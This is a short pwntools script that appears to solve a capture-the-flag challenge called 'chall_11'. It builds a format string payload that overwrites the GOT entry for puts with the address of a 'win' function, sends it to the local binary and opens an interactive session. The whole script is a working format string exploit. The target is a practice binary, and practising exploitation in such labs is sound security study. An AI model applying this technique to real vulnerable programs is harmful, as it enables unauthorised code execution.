from pwn import *
elf=ELF("./chall_11")
#construct a payload using format string
payload = fmtstr_payload(7,{elf.got.puts:elf.sym.win},write_size='byte')
r=process("./chall_11")
r.sendline(payload)
r.interactive()
r.close()
